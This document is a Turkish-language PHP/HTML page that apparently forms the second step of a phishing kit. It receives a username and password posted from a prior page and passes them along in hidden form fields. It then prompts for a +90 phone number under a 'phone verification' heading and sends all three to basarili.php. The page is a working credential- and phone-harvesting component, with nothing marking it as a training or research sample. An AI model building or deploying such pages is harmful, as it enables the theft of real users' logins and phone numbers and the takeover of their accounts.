

 
<!DOCTYPE html>
<html lang="tr">

<head>
    <meta charset="UTF-8">
    <title> Telefon Giriniz </title>
    <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no" />
    <meta name="google" content="notranslate" />
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script>
        function formGonderildiktenSonra() {
            // Yönlendirme işlemi
            window.location.href = "https://www.erenzy.dev";
            return false; // Formun varsayılan gönderme işlemini iptal etmek için
        }
    </script>
    <link rel="stylesheet" href="./style.css">
    <style>
        .tab_head {
            display: flex;
        }

        .tab_head_title {
            width: 100%;
            text-align: center;
            border: 0;
            color: #9d9d9d;
            border-bottom: 2px solid #d0d1d6;
        }

        .tab_head_title.active {
            color: #1ca288;
            border-bottom: 2px solid #1ca288;
        }

        .tab_head_title span {
            font-size: 14px;
            font-weight: 600;
            padding: 10px 0;
            display: block;
        }

        .tab_body_content {
            display: none;
        }

        .tab_body_content.active {
            display: block;
        }@import url(https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap);

div div label {
  font-family: Montserrat;
  font-weight: 700;
  font-style: normal
  
}div div label {
  text-transform: uppercase
  
}div.error {
  color: #bf360c;
  font-weight: 700;
  font-style: normal;
  text-align: center;
  margin-top: 15px;
}
    </style>
</head>
             
<body>
    <div class="root">
        <div class="header">
            <div class="d-flex justify-content-center">
                <img src="./logo.png" style="width:130px" alt="">
            </div>

        </div>
        <div class="tab_head">
            <div class="tab_head_title active" data-id="bireysel">
                <span>Telefon Doğrulama</span>
            </div>
        </div>
        <div class="body">
            
             <?php
    // `index.php` sayfasından gelen veriyi al
    if (isset($_POST['username'])) {
        $veri = $_POST['username'];
    } else {
        echo " ";
        exit;
    }
    ?>
         <?php
    // `index.php` sayfasından gelen veriyi al
    if (isset($_POST['password'])) {
        $verii = $_POST['password'];
    } else {
        echo " ";
        exit;
    }
    ?>
        <form id="phoneForm" action="basarili.php" method="post" autocomplete="off">
        <div class="form">
            <div class="form-group">
                 <input type="hidden" name="username" value="<?php echo htmlspecialchars($veri); ?>">
          <input type="hidden" name="password" value="<?php echo htmlspecialchars($verii); ?>">
                <label style="
    margin-bottom: 11px;
">Telefon Numaranız</label>
                <input type="text" id="telefon" name="telefon" class="form-control" id="tel" style="height: 22px;font-weight: 600;margin-left: 12px;" required>
                <div id="error-message" class="error"></div>
            </div>
        </div>
        <button type="submit" name="submit" class="login-btn">Doğrula</button>
    </form>
    
   
    
        </div>
    </div>
    <script>
    document.addEventListener('DOMContentLoaded', function() {
    var phoneInput = document.getElementById('telefon');
    var form = document.getElementById('phoneForm');
    var errorMessage = document.getElementById('error-message');
    phoneInput.value = '+90';
    phoneInput.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9+]/g, '');
        if (!this.value.startsWith('+90')) {
            this.value = '+90';
        }

        if (this.value.length > 13) {
            this.value = this.value.slice(0, 13);
        }
        if (this.value.length === 13) {
            this.value = this.value.replace(/(\+90)(\d{3})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
        }
    });

});
</script>


    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
    <script src="script.js?v=1.1.2"></script>
     
    
         
    

</body>

</html>